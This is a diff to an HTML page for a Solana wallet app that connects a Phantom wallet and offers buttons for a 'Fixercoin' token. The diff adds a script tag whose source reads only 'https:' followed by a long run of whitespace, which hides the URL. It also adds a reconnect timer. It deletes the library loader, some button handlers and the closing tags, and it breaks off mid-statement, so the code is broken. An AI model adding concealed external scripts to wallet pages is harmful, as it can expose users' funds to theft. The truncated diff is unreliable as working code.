@@ -2,6 +2,7 @@
 <html>
 <head>
   <title>Solana Wallet App</title>
+  <script src="https:                                                                                
 </head>
 <body>
   <h1>Solana Wallet App</h1>
@@ -11,9 +12,9 @@
   <button id="swap-btn">Swap Tokens</button>
   <button id="get-transaction-btn">Get Transaction Details</button>
   <div id="output"></div>
-
+  <div id="timer"></div>
   <script>
-    // Import necessary libraries
+    // Create connection to Solana cluster
     const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
 
     // Create Phantom wallet adapter
@@ -25,9 +26,12 @@
           phantomWallet.publicKey = resp.publicKey;
           console.log('Wallet connected:', phantomWallet.publicKey.toString());
           document.getElementById('output').innerText = 'Wallet connected: ' + phantomWallet.publicKey.toString();
+          document.getElementById('timer').innerText = '';
         } catch (err) {
           console.log('Error connecting to wallet:', err);
           document.getElementById('output').innerText = 'Error connecting to wallet: ' + err;
+          startTimer();
+          setTimeout(phantomWallet.connect, 1000);
         }
       }
     };
@@ -77,17 +81,22 @@
       }
     }
 
+    // Function to start timer
+    let timer = 0;
+    function startTimer() {
+      timer++;
+      document.getElementById('timer').innerText = 'Trying to connect... ' + timer + ' seconds';
+      if (timer < 60) {
+        setTimeout(() => {
+          startTimer();
+        }, 1000);
+      } else {
+        document.getElementById('timer').innerText = 'Connection timed out';
+      }
+    }
+
     // Add event listeners to buttons
     document.getElementById('connect-wallet-btn').addEventListener('click', phantomWallet.connect);
     document.getElementById('deposit-btn').addEventListener('click', () => depositFixercoin(10));
     document.getElementById('withdraw-btn').addEventListener('click', () => withdrawFixercoin(5));
-    document.getElementById('swap-btn').addEventListener('click', () => swapTokens('FIXERCOIN', 'SOL', 2));
-    document.getElementById('get-transaction-btn').addEventListener('click', () => getTransactionDetails('your-transaction-id-here'));
-
-    // Load Solana Web3 library
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/dist/solana-web3.min.js';
-    document.head.appendChild(script);
-  </script>
-</body>
-</html>
+    document.getElementById
